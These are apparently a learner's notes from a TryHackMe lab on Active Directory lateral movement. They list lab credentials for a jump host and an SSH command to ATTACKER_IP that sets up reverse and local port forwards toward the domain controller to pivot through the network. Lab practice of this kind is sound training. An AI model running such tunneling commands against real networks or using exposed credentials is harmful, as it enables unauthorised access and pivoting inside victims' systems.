
Creds http://distributor.za.tryhackme.com/creds

Username: 
bradley.cook 
Password: 
Onsl4845

ssh za\\bradley.cook@thmjmp2.za.tryhackme.com

tunneluser
Aa123456!@#

Complex port forwared

ssh tunneluser@ATTACKER_IP -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7878:127.0.0.1:7878 -N